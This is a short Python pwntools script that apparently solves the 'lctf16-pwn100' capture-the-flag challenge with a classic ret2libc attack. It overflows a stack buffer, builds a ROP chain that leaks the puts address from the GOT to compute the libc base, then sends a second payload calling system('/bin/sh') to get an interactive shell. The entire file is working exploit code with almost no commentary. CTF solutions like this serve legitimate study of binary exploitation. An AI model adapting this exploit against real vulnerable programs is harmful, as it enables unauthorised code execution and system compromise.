from pwn import *

elf = ELF("./lctf16-pwn100")
plt_puts = elf.plt['puts']
puts_got = elf.got['puts']
#libc_start_main_got = elf.got['__libc_start_main']
#plt_addr = elf.symbols['puts']
addr_start = 0x0000000000400550
#pop_rbp_ret = 0x0000000000400595
pop_rdi = 0x0000000000400763
ret = 0x00000000004004e1


offset= 0x40 + 0x8

payload1 = b'a'*offset + \
	p64(pop_rdi)+ \
	p64(puts_got)+\
	p64(plt_puts)+\
	p64(addr_start)
	
#print(payload1)
### 读够200字节才停止
payload1 = payload1.ljust(200,b'a')

sh = process('./lctf16-pwn100')
sh.send(payload1)
sh.recvuntil(b'bye~\n')
puts_addr = u64(sh.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
#print(hex(puts_addr))

libc = elf.libc
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
#print(hex(system_addr))
#addr_bin_sh

a  = next(libc.search(b'/bin/sh'))
bin_sh_addr = libc_base + a
#print(hex(bin_sh_addr))

payload = b"A"*offset+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)
payload = payload.ljust(200, b"a")	
 
sh.send(payload)
sh.interactive()

